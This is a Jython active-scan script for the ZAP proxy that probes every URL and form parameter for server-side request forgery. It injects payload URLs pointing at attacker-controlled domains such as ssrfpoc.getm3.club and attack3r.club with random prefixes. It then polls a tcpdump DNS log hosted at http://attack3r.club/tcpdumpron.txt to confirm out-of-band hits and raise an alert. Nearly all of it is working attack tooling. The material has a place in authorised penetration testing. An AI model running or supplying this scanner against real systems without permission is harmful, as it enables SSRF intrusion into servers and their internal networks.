"""
The scanNode function will typically be called once for every page 
The scan function will typically be called for every parameter in every URL and Form for every page 

Note that new active scripts will initially be disabled
Right click the script in the Scripts tree and select "enable"  
"""
import org.apache.http.HttpResponse
import org.apache.http.client.HttpClient
import org.apache.http.impl.client.DefaultHttpClient
import org.apache.http.client.methods.HttpGet
import org.apache.http.util.EntityUtils
import time
import random


def checkDnsHit(prefix_payload):
	client =  org.apache.http.impl.client.DefaultHttpClient()
	request = org.apache.http.client.methods.HttpGet("http://attack3r.club/tcpdumpron.txt") 
	#tcpdump -n port 53 | tee -a tcpdumpron.txt
	response = client.execute(request);
	
	responseString = org.apache.http.util.EntityUtils.toString(response.getEntity(), "UTF-8");
	body = str(responseString)
	if prefix_payload in body or prefix_payload.upper() in body:
		return True
	else:
 		return False


payloads = ['http://ssrfpoc.getm3.club', 'https://ssrfpoc.getm3.club', 'ssrfpoc.getm3.club', 'http://ssrfpoc.obb.attack3r.club', 'https://ssrfpoc.obb.attack3r.club', 'ssrfpoc.obb.attack3r.club']
positive_responses = ['Exception', 'exception']

def scanNode(sas, msg):
  # Debugging can be done using print like this
  #print('--scan called for url=' + msg.getRequestHeader().getURI().toString());

  # Copy requests before reusing them
  msg = msg.cloneRequest();

  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
  try:
  	sas.sendAndReceive(msg, False, False);
  except:
	print("Error when send http req")
  # Test the responses and raise alerts as below


def scan(sas, msg, param, value):
  # Debugging can be done using print like this
  print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
    ' param=' + param + ' value=' + value);
  	
  for p in payloads:
	prefix="ssrfpoc" + str(random.randint(100000, 999999))
	payload = p.replace("ssrfpoc",prefix )
  	# Copy requests before reusing them
	
  	msg_clone = msg.cloneRequest();
	
  	# setParam (message, parameterName, newValue)
  	sas.setParam(msg_clone, param, payload);

  	# sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
	try:
  		sas.sendAndReceive(msg_clone, False, False);
		res_body_str = msg_clone.getResponseBody().toString()
	except:
		print('Error sending request')
	time.sleep(3)
	if checkDnsHit(prefix):
		sas.raiseAlert(3, 2, 'Server Side Request Forgery', 'SSRF Detected', msg_clone.getRequestHeader().getURI().toString(), param, payload, 'Any other info', 'The solution ', '' , 0, 0, msg_clone);
	
	